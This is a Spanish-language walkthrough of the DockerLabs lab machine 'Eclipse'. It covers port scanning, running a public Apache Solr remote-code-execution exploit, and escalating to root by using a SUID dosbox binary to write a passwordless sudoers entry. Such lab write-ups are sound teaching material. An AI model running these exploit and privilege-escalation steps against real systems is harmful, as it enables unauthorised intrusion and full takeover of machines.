# Máquina Eclipse

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

Creador -> [Xerosec](https://hack.xero-sec.com/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
8983/tcp open  unknown syn-ack

```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p80,8983 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Epic Battle
8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://172.17.0.2:8983/solr/
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

--------------
## Explotación

Accedemos a la web del puerto 8983 y encontramos un panel de administración de **solr**.
Buscaremos exploits para vulnerabilidades en **Solr**

![Pasted image 20240423203423](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/8fa817ad-01e3-440a-a457-0cb1e1329ed3)

Hay un Remote Code Execution en concreto que llama la atención, lo descargamos y lo ejecutamos sobre la IP víctima:

```shell
searchsploit -m java/webapps/47572.py
python3 47572.py 172.17.0.2
----------------------------------------------
OS Realese: Linux, OS Version: 6.1.0-1parrot1-amd64
if remote exec failed, you should change your command with right os platform

Init node 0xDojo Successfully, exec command=whoami
RCE Successfully @Apache Solr node 0xDojo
   ninhack
```

Por defecto ejecuta el comando **whoami** y vemos que ha sido exitoso por lo que trataremos de que ejecute otro comando que nos envíe una **Reverse Shell**.

Nos pondremos en escucha con **netcat**

![Pasted image 20240423213014](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/d71a6063-c956-4f6b-b4f4-dad7e43f7ffb)

Estamos dentro !

------------------------------
### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------
## Escalada de privilegios

Revisamos las archivos con permisos **SUID**:

```shell
find / -perm -4000 2>/dev/null
------------------------------------
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/dosbox
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Podemos ejecutar **dosbox** como **root**.
Lo explotamos modificando el **etc sudoers** de nuestro user:

```shell
LFILE='\etc\sudoers.d\ninhack'
/usr/bin/dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL) NOPASSWD: ALL >c:$LFILE" -c exit
```

```shell
sudo su
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo ! 
